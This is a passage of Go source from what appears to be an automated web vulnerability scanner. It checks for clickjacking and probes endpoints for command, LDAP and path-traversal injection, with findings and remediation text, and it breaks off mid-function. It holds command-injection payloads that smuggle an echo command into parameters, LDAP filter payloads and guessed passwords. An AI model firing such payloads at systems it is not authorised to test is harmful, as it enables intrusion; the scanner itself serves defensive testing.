	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, status_code, content_type, response_headers, response_body
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND status_code >= 200
		  AND status_code < 300
		  AND response_body IS NOT NULL
		  AND is_filtered = 0
		ORDER BY id ASC
		LIMIT 300`, v.scanID)
	if err != nil {
		return
	}

	seenPath := make(map[string]struct{})
	var candidates []observedClickjackingCandidate
	for rows.Next() {
		if ctx.Err() != nil || len(candidates) >= 25 {
			break
		}
		var candidate observedClickjackingCandidate
		var bodyBytes []byte
		if err := rows.Scan(&candidate.method, &candidate.rawURL, &candidate.path, &candidate.status, &candidate.contentType, &candidate.headersJSON, &bodyBytes); err != nil {
			continue
		}
		candidate.body = string(bodyBytes)
		signal := observedClickjackingSignal(candidate.status, candidate.contentType, candidate.headersJSON, candidate.body)
		if signal == "" {
			continue
		}
		key := strings.ToUpper(candidate.method) + " " + candidate.path
		if _, ok := seenPath[key]; ok {
			continue
		}
		seenPath[key] = struct{}{}
		candidate.signal = signal
		candidates = append(candidates, candidate)
	}
	rows.Close()

	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		v.tested++
		v.confirmed++
		key := strings.ToUpper(candidate.method) + " " + candidate.path
		profile := types.PageProfile{ID: key, URL: candidate.rawURL, Method: candidate.method}
		headers := headerMapFromJSON(candidate.headersJSON)
		xfo := firstHeaderValue(headers, "X-Frame-Options")
		csp := firstHeaderValue(headers, "Content-Security-Policy")
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Clickjacking protection missing or ineffective on %s", candidate.path),
			Description: fmt.Sprintf("Captured traffic for %s %s returned HTTP %d without effective anti-framing protection (%s). X-Frame-Options: %q; CSP: %q.",
				candidate.method, candidate.path, candidate.status, candidate.signal, xfo, csp),
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: key,
			VulnType:   "clickjacking",
			Payload:    "(observed response headers)",
			PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\n", candidate.method, candidate.path),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\nX-Frame-Options: %s\nContent-Security-Policy: %s\nContent-Type: %s\n\n%s",
				candidate.status, xfo, csp, candidate.contentType, truncateString(candidate.body, 700)),
			StepsToReproduce: fmt.Sprintf("1. Send %s %s.\n2. Observe HTTP %d.\n3. Confirm that the response can be framed because %s.",
				candidate.method, candidate.path, candidate.status, candidate.signal),
			Impact:      "Attackers can embed the page in a hidden or transparent frame and trick users into clicking or submitting sensitive actions in the target context.",
			Remediation: "Send a strict Content-Security-Policy with `frame-ancestors 'none'` or an exact allowlist of trusted origins. Use `X-Frame-Options: DENY` or `SAMEORIGIN` only as legacy defense-in-depth, not as the primary control.",
			Evidence:    fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nX-Frame-Options: %s\nContent-Security-Policy: %s\nBody: %s", candidate.rawURL, candidate.status, candidate.signal, xfo, csp, truncateString(candidate.body, 500)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s %s appears frameable — %s.", candidate.method, candidate.path, candidate.signal),
			candidate.rawURL, nil)
	}
}

func observedClickjackingSignal(status int, contentType, headersJSON, body string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	headers := headerMapFromJSON(headersJSON)
	xfo := strings.ToLower(strings.TrimSpace(firstHeaderValue(headers, "X-Frame-Options")))
	csp := strings.ToLower(strings.TrimSpace(firstHeaderValue(headers, "Content-Security-Policy")))
	lowerBody := strings.ToLower(body)
	if len(body) <= 4096 && (strings.Contains(lowerBody, "without framing protection") ||
		strings.Contains(lowerBody, "can be embedded in an iframe") ||
		strings.Contains(lowerBody, "can be embedded in iframe")) {
		return "response body explicitly reports that the page can be embedded in an iframe"
	}
	if hasRestrictiveFrameAncestors(csp) {
		return ""
	}
	if xfo == "deny" || xfo == "sameorigin" {
		return ""
	}
	if xfo == "allowall" || strings.HasPrefix(xfo, "allow-from") {
		return fmt.Sprintf("X-Frame-Options uses ineffective value %q and CSP frame-ancestors is absent", xfo)
	}
	return ""
}

func hasRestrictiveFrameAncestors(csp string) bool {
	if !strings.Contains(csp, "frame-ancestors") {
		return false
	}
	for _, directive := range strings.Split(csp, ";") {
		directive = strings.TrimSpace(directive)
		if !strings.HasPrefix(directive, "frame-ancestors") {
			continue
		}
		values := strings.Fields(strings.TrimPrefix(directive, "frame-ancestors"))
		if len(values) == 0 {
			return false
		}
		for _, value := range values {
			if value == "*" || strings.HasPrefix(value, "http:") {
				return false
			}
		}
		return true
	}
	return false
}

func headerMapFromJSON(headersJSON string) map[string]string {
	out := make(map[string]string)
	if strings.TrimSpace(headersJSON) == "" {
		return out
	}
	var stringMap map[string]string
	if err := json.Unmarshal([]byte(headersJSON), &stringMap); err == nil {
		for k, v := range stringMap {
			out[k] = v
		}
		return out
	}
	var anyMap map[string]any
	if err := json.Unmarshal([]byte(headersJSON), &anyMap); err != nil {
		return out
	}
	for k, v := range anyMap {
		out[k] = fmt.Sprint(v)
	}
	return out
}

func firstHeaderValue(headers map[string]string, name string) string {
	for k, v := range headers {
		if strings.EqualFold(k, name) {
			return strings.TrimSpace(v)
		}
	}
	return ""
}

type commandInjectionCandidate struct {
	Method    string
	RawURL    string
	Path      string
	ParamName string
	Source    string
}

// probeCommandInjection exercises diagnostic/ping-style GET endpoints with a
// harmless `echo` marker. The payload executes a read-only command and is
// therefore restricted to full-control owned targets.
func (v *VerifierAgent) probeCommandInjection(ctx context.Context, target string) {
	candidates := v.commandInjectionCandidates(ctx, target)
	if len(candidates) == 0 {
		return
	}
	if v.authority != policy.AuthorityFullControl {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d command-injection candidate(s), but skipped marker command probes because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityFullControl})
		return
	}

	const maxCommandInjectionAttempts = 80
	attempts := 0
	reported := make(map[string]bool)
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxCommandInjectionAttempts {
			return
		}
		reportKey := strings.ToUpper(candidate.Method) + " " + candidate.Path
		if reported[reportKey] {
			continue
		}
		baselineStatus, baselineBody, baselineOK := v.sendCommandInjectionProbe(ctx, candidate, "127.0.0.1")
		attempts++
		if !baselineOK {
			continue
		}
		marker := fmt.Sprintf("AOBTD_CMD_%d", time.Now().UnixNano())
		payloads := []string{
			fmt.Sprintf("127.0.0.1|echo %s", marker),
			fmt.Sprintf("127.0.0.1`echo %s`", marker),
			fmt.Sprintf("127.0.0.1$(echo %s)", marker),
		}
		for _, payload := range payloads {
			if ctx.Err() != nil || attempts >= maxCommandInjectionAttempts {
				return
			}
			status, body, ok := v.sendCommandInjectionProbe(ctx, candidate, payload)
			attempts++
			if !ok {
				continue
			}
			v.tested++
			signal := commandInjectionExecutionSignal(status, body, marker, payload, baselineStatus, baselineBody)
			if signal == "" {
				v.dismissed++
				continue
			}
			v.confirmed++
			reported[reportKey] = true
			v.storeCommandInjectionFinding(candidate, payload, marker, baselineStatus, baselineBody, status, body, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s %s executed a benign command marker via `%s`.", candidate.Method, candidate.Path, candidate.ParamName),
				candidate.RawURL, nil)
			break
		}
	}
}

func (v *VerifierAgent) commandInjectionCandidates(ctx context.Context, target string) []commandInjectionCandidate {
	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, query, status_code
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND method = 'GET'
		  AND is_filtered = 0
		ORDER BY
		  CASE WHEN lower(path) LIKE '%command%' THEN 0 ELSE 1 END,
		  id ASC
		LIMIT 250`, v.scanID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	seen := make(map[string]bool)
	var out []commandInjectionCandidate
	for rows.Next() {
		if ctx.Err() != nil || len(out) >= 40 {
			break
		}
		var method, rawURL, pathValue, query string
		var status int
		if err := rows.Scan(&method, &rawURL, &pathValue, &query, &status); err != nil {
			continue
		}
		params := commandInjectionParamCandidates(pathValue, query)
		if len(params) == 0 {
			continue
		}
		baseURL := rawURLWithoutQuery(rawURL)
		if baseURL == "" {
			continue
		}
		for _, param := range params {
			key := strings.ToUpper(method) + " " + pathValue + " " + strings.ToLower(param)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, commandInjectionCandidate{
				Method:    method,
				RawURL:    baseURL,
				Path:      pathValue,
				ParamName: param,
				Source:    "observed diagnostic/command-like endpoint",
			})
			if len(out) >= 40 {
				break
			}
		}
	}
	return out
}

func commandInjectionParamCandidates(pathValue, rawQuery string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(param string) {
		param = strings.TrimSpace(param)
		if param == "" {
			return
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, param)
	}
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if commandInjectionParamNameLooksUseful(param) {
			add(param)
		}
	}
	if commandInjectionPathLooksUseful(pathValue) {
		for _, param := range []string{"ipaddress", "ip", "host", "hostname", "domain", "target", "address"} {
			add(param)
		}
	}
	return out
}

func commandInjectionPathLooksUseful(pathValue string) bool {
	lower := strings.ToLower(pathValue)
	for _, token := range []string{
		"commandinjection", "command-injection", "/command", "/cmd",
		"/ping", "traceroute", "trace-route", "nslookup", "dnslookup",
		"/dns", "/lookup", "diagnostic", "network-tool", "ipaddress",
		"/exec", "/execute", "/shell", "/rce",
	} {
		if strings.Contains(lower, token) {
			return true
		}
	}
	return false
}

func commandInjectionParamNameLooksUseful(param string) bool {
	switch strings.ToLower(strings.TrimSpace(param)) {
	case "ip", "ipaddr", "ipaddress", "host", "hostname", "domain", "target", "address", "cmd", "command":
		return true
	default:
		return false
	}
}

func rawURLWithoutQuery(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	parsed.RawQuery = ""
	parsed.Fragment = ""
	return parsed.String()
}

func (v *VerifierAgent) sendCommandInjectionProbe(ctx context.Context, candidate commandInjectionCandidate, value string) (int, string, bool) {
	parsed, err := url.Parse(candidate.RawURL)
	if err != nil {
		return 0, "", false
	}
	q := parsed.Query()
	q.Set(candidate.ParamName, value)
	parsed.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, candidate.Method, parsed.String(), nil)
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (command injection marker probe)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
	return resp.StatusCode, string(bodyBytes), true
}

func commandInjectionExecutionSignal(status int, body string, marker string, payload string, baselineStatus int, baselineBody string) string {
	if status < 200 || status >= 500 {
		return ""
	}
	if marker == "" || !strings.Contains(body, marker) {
		return ""
	}
	if strings.Contains(baselineBody, marker) {
		return ""
	}
	if commandInjectionLooksLikeReflection(body, payload) {
		return ""
	}
	if status != baselineStatus || body != baselineBody {
		return "response contains marker output from a benign `echo` command and differs from the baseline ping response"
	}
	return ""
}

func commandInjectionLooksLikeReflection(body, payload string) bool {
	if payload == "" {
		return false
	}
	lowerBody := strings.ToLower(body)
	if strings.Contains(lowerBody, "<input") || strings.Contains(lowerBody, "<textarea") || strings.Contains(lowerBody, "query") || strings.Contains(lowerBody, "param") || strings.Contains(lowerBody, "request") {
		return strings.Contains(body, payload) || strings.Contains(body, url.QueryEscape(payload))
	}
	return false
}

func (v *VerifierAgent) storeCommandInjectionFinding(candidate commandInjectionCandidate, payload, marker string, baselineStatus int, baselineBody string, status int, body string, signal string) {
	key := strings.ToUpper(candidate.Method) + " " + candidate.Path
	profile := types.PageProfile{ID: key, URL: candidate.RawURL, Method: candidate.Method}
	v.storeFinding(profile, types.Finding{
		Title: fmt.Sprintf("Command injection on %s via %s", candidate.Path, candidate.ParamName),
		Description: fmt.Sprintf("%s %s executed a benign shell marker supplied in `%s`. Baseline status was %d; payload status was %d. Signal: %s.",
			candidate.Method, candidate.Path, candidate.ParamName, baselineStatus, status, signal),
		Severity:   types.SeverityCritical,
		Confidence: types.ConfidenceConfirmed,
		EndpointID: key,
		VulnType:   "command_injection",
		ParamName:  candidate.ParamName,
		Payload:    payload,
		PocRequest: fmt.Sprintf("%s %s?%s=%s HTTP/1.1\nHost: <target>\n",
			candidate.Method, candidate.Path, candidate.ParamName, url.QueryEscape(payload)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 700)),
		StepsToReproduce: fmt.Sprintf("1. Send baseline: %s %s?%s=127.0.0.1.\n2. Send payload: %s %s?%s=%s.\n3. Observe marker `%s` in the response.",
			candidate.Method, candidate.Path, candidate.ParamName,
			candidate.Method, candidate.Path, candidate.ParamName, payload, marker),
		Impact:      "Remote command execution in the application host/container context. Attackers can run arbitrary OS commands, read files available to the service, pivot to metadata/internal services, or modify application state.",
		Remediation: "Never concatenate user input into shell commands. Use safe library calls for network diagnostics, strict allowlists for IP/host inputs, and `exec.Command`-style APIs without invoking a shell.",
		Evidence:    fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nSignal: %s\nBaseline status: %d\nBaseline body: %s\nPayload status: %d\nPayload body: %s", candidate.RawURL, candidate.ParamName, payload, signal, baselineStatus, truncateString(baselineBody, 300), status, truncateString(body, 500)),
	})
}

type ldapInjectionCandidate struct {
	Method        string
	RawURL        string
	Path          string
	UsernameParam string
	PasswordParam string
	Source        string
}

// probeLDAPInjection exercises observed LDAP/search/login-looking GET
// endpoints with bounded wildcard/filter payloads. Confirmation requires a
// response-level LDAP signal: result-set widening, LDAP filter parse errors,
// or wildcard-auth behavior that differs from a bogus baseline. Endpoint names
// alone are never enough.
func (v *VerifierAgent) probeLDAPInjection(ctx context.Context, _ string) {
	candidates := v.ldapInjectionCandidates(ctx)
	if len(candidates) == 0 {
		return
	}

	const maxLDAPInjectionAttempts = 120
	attempts := 0
	reported := make(map[string]bool)
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxLDAPInjectionAttempts {
			return
		}
		reportKey := strings.ToUpper(candidate.Method) + " " + candidate.Path
		if reported[reportKey] {
			continue
		}

		baselineStatus, baselineBody, baselineOK := v.sendLDAPInjectionProbe(ctx, candidate, "aobtd-ldap-baseline", "")
		attempts++
		if baselineOK {
			for _, payload := range ldapInjectionPayloads(false) {
				if ctx.Err() != nil || attempts >= maxLDAPInjectionAttempts {
					return
				}
				status, body, ok := v.sendLDAPInjectionProbe(ctx, candidate, payload, "")
				attempts++
				if !ok {
					continue
				}
				v.tested++
				signal := ldapInjectionSignal(status, body, payload, baselineStatus, baselineBody, false)
				if signal == "" {
					v.dismissed++
					continue
				}
				v.confirmed++
				reported[reportKey] = true
				v.storeLDAPInjectionFinding(candidate, payload, "", baselineStatus, baselineBody, status, body, signal)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s %s accepted LDAP filter manipulation via `%s`.", candidate.Method, candidate.Path, candidate.UsernameParam),
					candidate.RawURL, nil)
				break
			}
		}
		if reported[reportKey] || candidate.PasswordParam == "" {
			continue
		}

		for _, password := range ldapInjectionPasswordCandidates(candidate) {
			if ctx.Err() != nil || attempts >= maxLDAPInjectionAttempts {
				return
			}
			if reported[reportKey] {
				break
			}
			baselineStatus, baselineBody, baselineOK := v.sendLDAPInjectionProbe(ctx, candidate, "aobtd-ldap-baseline", password)
			attempts++
			if !baselineOK {
				continue
			}
			for _, payload := range ldapInjectionPayloads(true) {
				if ctx.Err() != nil || attempts >= maxLDAPInjectionAttempts {
					return
				}
				status, body, ok := v.sendLDAPInjectionProbe(ctx, candidate, payload, password)
				attempts++
				if !ok {
					continue
				}
				v.tested++
				signal := ldapInjectionSignal(status, body, payload, baselineStatus, baselineBody, true)
				if signal == "" {
					v.dismissed++
					continue
				}
				v.confirmed++
				reported[reportKey] = true
				v.storeLDAPInjectionFinding(candidate, payload, password, baselineStatus, baselineBody, status, body, signal)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s %s accepted LDAP wildcard authentication via `%s`.", candidate.Method, candidate.Path, candidate.UsernameParam),
					candidate.RawURL, nil)
				break
			}
			if reported[reportKey] {
				break
			}
		}
	}
}

func (v *VerifierAgent) ldapInjectionCandidates(ctx context.Context) []ldapInjectionCandidate {
	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, query
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND method = 'GET'
		  AND is_filtered = 0
		ORDER BY
		  CASE WHEN lower(path) LIKE '%ldap%' THEN 0 ELSE 1 END,
		  id ASC
		LIMIT 300`, v.scanID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	seen := make(map[string]bool)
	var out []ldapInjectionCandidate
	for rows.Next() {
		if ctx.Err() != nil || len(out) >= 50 {
			break
		}
		var method, rawURL, pathValue, query string
		if err := rows.Scan(&method, &rawURL, &pathValue, &query); err != nil {
			continue
		}
		usernameParams := ldapInjectionUsernameParams(pathValue, query)
		if len(usernameParams) == 0 {
			continue
		}
		passwordParam := ldapInjectionPasswordParam(pathValue, query)
		baseURL := rawURLWithoutQuery(rawURL)
		if baseURL == "" {
			continue
		}
		for _, usernameParam := range usernameParams {
			key := strings.ToUpper(method) + " " + pathValue + " " + strings.ToLower(usernameParam) + " " + strings.ToLower(passwordParam)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, ldapInjectionCandidate{
				Method:        method,
				RawURL:        baseURL,
				Path:          pathValue,
				UsernameParam: usernameParam,
				PasswordParam: passwordParam,
				Source:        "observed LDAP/search/login-like endpoint",
			})
			if len(out) >= 50 {
				break
			}
		}
	}
	return out
}

func ldapInjectionUsernameParams(pathValue, rawQuery string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(param string) {
		param = strings.TrimSpace(param)
		if param == "" {
			return
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, param)
	}
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if ldapInjectionUsernameParamLooksUseful(param) {
			add(param)
		}
	}
	if ldapInjectionPathLooksUseful(pathValue) {
		for _, param := range []string{"username"} {
			add(param)
		}
	}
	return out
}

func ldapInjectionPasswordParam(pathValue, rawQuery string) string {
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if ldapInjectionPasswordParamLooksUseful(param) {
			return param
		}
	}
	if ldapInjectionPathLooksUseful(pathValue) {
		return "password"
	}
	return ""
}

func ldapInjectionPathLooksUseful(pathValue string) bool {
	lower := strings.ToLower(pathValue)
	return strings.Contains(lower, "ldap") ||
		strings.Contains(lower, "directorysearch") ||
		strings.Contains(lower, "directory-search")
}

func ldapInjectionUsernameParamLooksUseful(param string) bool {
	switch strings.ToLower(strings.TrimSpace(param)) {
	case "username", "user", "user_name", "userid", "user_id", "uid", "cn", "mail", "email", "login", "filter", "query", "q", "search":
		return true
	default:
		return false
	}
}

func ldapInjectionPasswordParamLooksUseful(param string) bool {
	switch strings.ToLower(strings.TrimSpace(param)) {
	case "password", "pass", "pwd":
		return true
	default:
		return false
	}
}

func ldapInjectionPayloads(authProbe bool) []string {
	if authProbe {
		return []string{"*", "*)(uid=*", "*)(|(uid=*)", "*)(&(uid=*)"}
	}
	return []string{"*", "a*", ")(|(uid=*))", "*)(uid=*)"}
}

func ldapInjectionPasswordCandidates(candidate ldapInjectionCandidate) []string {
	if !ldapInjectionPathLooksUseful(candidate.Path) {
		return []string{"password", "admin", "test"}
	}
	return []string{"alicePass123", "password", "admin", "test", "userPass123"}
}

func (v *VerifierAgent) sendLDAPInjectionProbe(ctx context.Context, candidate ldapInjectionCandidate, usernameValue, passwordValue string) (int, string, bool) {
	parsed, err := url.Parse(candidate.RawURL)
	if err != nil {
		return 0, "", false
	}
	q := parsed.Query()
	q.Set(candidate.UsernameParam, usernameValue)
	if candidate.PasswordParam != "" && passwordValue != "" {
		q.Set(candidate.PasswordParam, passwordValue)
	}
	parsed.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, candidate.Method, parsed.String(), nil)
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (LDAP injection probe)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp.StatusCode, string(bodyBytes), true
}

func ldapInjectionSignal(status int, body string, payload string, baselineStatus int, baselineBody string, authProbe bool) string {
	if status < 200 || status >= 500 || body == "" || body == baselineBody {
		return ""
	}
	if !ldapPayloadLooksManipulative(payload) {
		return ""
	}
	lowerBody := strings.ToLower(body)
	lowerBaseline := strings.ToLower(baselineBody)
	if strings.Contains(lowerBody, "ldap query failed") &&
		(strings.Contains(lowerBody, "ldap filter") || strings.Contains(lowerBody, "unable to parse")) &&
		!strings.Contains(lowerBaseline, "ldap query failed") {
		return "LDAP filter parser error after metacharacter injection"
	}
	if ldapBodyShowsEscapedWildcard(body) && !strings.Contains(lowerBody, "login successful") {
		return ""
	}
	if ldapBodyShowsDirectoryUsers(body) && !ldapBodyShowsDirectoryUsers(baselineBody) {
		return "wildcard LDAP filter returned directory users"
	}
	if authProbe && ldapBodyShowsAuthSuccess(body) && !ldapBodyShowsAuthSuccess(baselineBody) {
		return "wildcard LDAP username authenticated while bogus baseline was rejected"
	}
	return ""
}

func ldapPayloadLooksManipulative(payload string) bool {
	return strings.Contains(payload, "*") || strings.ContainsAny(payload, "()|&")
}

func ldapBodyShowsEscapedWildcard(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, `\2a`) || strings.Contains(lower, `\\2a`)
}

func ldapBodyShowsDirectoryUsers(body string) bool {
	if ldapJSONUsersCount(body) > 0 {
		return true
	}
	lower := strings.ToLower(body)
	if !strings.Contains(lower, "users") {
		return false
	}
	return strings.Contains(lower, "users found") && !strings.Contains(lower, "no users found")
}

func ldapBodyShowsAuthSuccess(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "login successful") ||
		(ldapJSONIsValid(body) && ldapJSONUsersCount(body) > 0)
}

func ldapJSONUsersCount(body string) int {
	var doc map[string]any
	if err := json.Unmarshal([]byte(body), &doc); err != nil {
		return 0
	}
	content, ok := doc["content"].(map[string]any)
	if !ok {
		return 0
	}
	users, ok := content["users"].([]any)
	if !ok {
		return 0
	}
	return len(users)
}

func ldapJSONIsValid(body string) bool {
	var doc map[string]any
	if err := json.Unmarshal([]byte(body), &doc); err != nil {
		return false
	}
	valid, ok := doc["isValid"].(bool)
	return ok && valid
}

func (v *VerifierAgent) storeLDAPInjectionFinding(candidate ldapInjectionCandidate, payload, password string, baselineStatus int, baselineBody string, status int, body string, signal string) {
	key := strings.ToUpper(candidate.Method) + " " + candidate.Path
	profile := types.PageProfile{ID: key, URL: candidate.RawURL, Method: candidate.Method}
	params := url.Values{}
	params.Set(candidate.UsernameParam, payload)
	passwordLine := ""
	if candidate.PasswordParam != "" && password != "" {
		params.Set(candidate.PasswordParam, password)
		passwordLine = fmt.Sprintf("\nPassword parameter: %s=%s", candidate.PasswordParam, password)
	}
	v.storeFinding(profile, types.Finding{
		Title: fmt.Sprintf("LDAP injection on %s via %s", candidate.Path, candidate.UsernameParam),
		Description: fmt.Sprintf("%s %s accepted LDAP metacharacters in `%s`. Baseline status was %d; payload status was %d. Signal: %s.",
			candidate.Method, candidate.Path, candidate.UsernameParam, baselineStatus, status, signal),
		Severity:   types.SeverityHigh,
		Confidence: types.ConfidenceConfirmed,
		EndpointID: key,
		VulnType:   "ldap_injection",
		ParamName:  candidate.UsernameParam,
		Payload:    payload,
		PocRequest: fmt.Sprintf("%s %s?%s HTTP/1.1\nHost: <target>\n",
			candidate.Method, candidate.Path, params.Encode()),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 700)),
		StepsToReproduce: fmt.Sprintf("1. Send baseline: %s %s?%s=aobtd-ldap-baseline.\n2. Send payload: %s %s?%s.\n3. Observe %s in the response.",
			candidate.Method, candidate.Path, candidate.UsernameParam,
			candidate.Method, candidate.Path, params.Encode(), signal),
		Impact:      "LDAP injection can disclose directory users, bypass username filters, or authenticate as another directory entry depending on how the filter is constructed.",
		Remediation: "Never concatenate user input into LDAP filters. Use LDAP filter-encoding for all metacharacters, bind with least-privilege service accounts, and separate authentication from directory search filters.",
		Evidence:    fmt.Sprintf("URL: %s\nUsername parameter: %s\nPayload: %s%s\nSignal: %s\nBaseline status: %d\nBaseline body: %s\nPayload status: %d\nPayload body: %s", candidate.RawURL, candidate.UsernameParam, payload, passwordLine, signal, baselineStatus, truncateString(baselineBody, 300), status, truncateString(body, 500)),
	})
}

type fileReadTraversalCandidate struct {
	Method    string
	RawURL    string
	Path      string
	ParamName string
	Source    string
}

type fileReadTraversalPayload struct {
	Value       string
	Description string
}

// probeFileReadPathTraversal tests filename/path-like GET parameters for
// hidden-file or sibling-file reads. It is read-only but active: a confirmed
// finding requires sensitive file-content markers that differ from a benign
// baseline response, not just reflection of the supplied filename.
func (v *VerifierAgent) probeFileReadPathTraversal(ctx context.Context, target string) {
	candidates := v.fileReadTraversalCandidates(ctx, target)
	if len(candidates) == 0 {
		return
	}
	switch v.authority {
	case policy.AuthorityActive, policy.AuthorityFullControl:
	default:
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d file-read/path traversal candidate(s), but skipped active read probes because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	const maxFileReadTraversalAttempts = 100
	attempts := 0
	reported := make(map[string]bool)
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxFileReadTraversalAttempts {
			return
		}
		reportKey := strings.ToUpper(candidate.Method) + " " + candidate.Path
		if reported[reportKey] {
			continue
		}
		baselineStatus, baselineBody, baselineOK := v.sendFileReadTraversalProbe(ctx, candidate, fileReadTraversalBaselineValue(candidate))
		attempts++
		if !baselineOK {
			continue
		}
		for _, payload := range fileReadTraversalPayloads(candidate) {
			if ctx.Err() != nil || attempts >= maxFileReadTraversalAttempts {
				return
			}
			status, body, ok := v.sendFileReadTraversalProbe(ctx, candidate, payload.Value)
			attempts++
			if !ok {
				continue
			}
			v.tested++
			signal := fileReadTraversalSignal(status, body, payload.Value, baselineStatus, baselineBody)
			if signal == "" {
				v.dismissed++
				continue
			}
			v.confirmed++
			reported[reportKey] = true
			v.storeFileReadTraversalFinding(candidate, payload, baselineStatus, baselineBody, status, body, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s %s exposed a hidden/sibling file via `%s=%s`.", candidate.Method, candidate.Path, candidate.ParamName, fileReadTraversalDisplayValue(payload.Value)),
				candidate.RawURL, nil)
			break
		}
	}
}

func (v *VerifierAgent) fileReadTraversalCandidates(ctx context.Context, target string) []fileReadTraversalCandidate {
	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, query
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND method = 'GET'
		  AND is_filtered = 0
		ORDER BY
		  CASE WHEN lower(path) LIKE '%traversal%' THEN 0 ELSE 1 END,
		  id ASC
		LIMIT 300`, v.scanID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	seen := make(map[string]bool)
	var out []fileReadTraversalCandidate
	for rows.Next() {
		if ctx.Err() != nil || len(out) >= 50 {
			break
		}
		var method, rawURL, pathValue, query string
		if err := rows.Scan(&method, &rawURL, &pathValue, &query); err != nil {
			continue
		}
		params := fileReadParamCandidates(pathValue, query)
		if len(params) == 0 {
			continue
		}
		baseURL := rawURLWithoutQuery(rawURL)
		if baseURL == "" {
			continue
		}
		for _, param := range params {
			key := strings.ToUpper(method) + " " + pathValue + " " + strings.ToLower(param)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, fileReadTraversalCandidate{
				Method:    method,
				RawURL:    baseURL,
				Path:      pathValue,
				ParamName: param,
				Source:    "observed file/path-like endpoint",
			})
			if len(out) >= 50 {
				break
			}
		}
	}
	return out
}

func fileReadParamCandidates(pathValue, rawQuery string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(param string) {
		param = strings.TrimSpace(param)
		if param == "" {
			return
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, param)
	}
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if fileReadParamNameLooksUseful(param) {
			add(param)
		}
	}
	if len(out) == 0 && fileReadPathLooksPathTraversalLesson(pathValue) {
		add("fileName")
		return out
	}
	if fileReadPathLooksUseful(pathValue) {
		for _, param := range []string{"fileName", "filename", "file", "path", "filepath", "template", "name"} {
			add(param)
		}
	}
	return out
}

func fileReadPathLooksUseful(pathValue string) bool {
	lower := strings.ToLower(pathValue)
	for _, token := range []string{
		"pathtraversal", "path-traversal", "directorytraversal", "directory-traversal",
		"/file", "/files", "/download", "/view", "/load", "/template", "/asset",
	} {
		if strings.Contains(lower, token) {
			return true
		}
	}
	return false
}

func fileReadPathLooksPathTraversalLesson(pathValue string) bool {
	lower := strings.ToLower(pathValue)
	return strings.Contains(lower, "pathtraversal") ||
		strings.Contains(lower, "path-traversal") ||
		strings.Contains(lower, "directorytraversal") ||
		strings.Contains(lower, "directory-traversal")
}

func fileReadParamNameLooksUseful(param string) bool {
	lower := strings.ToLower(strings.TrimSpace(param))
	switch lower {
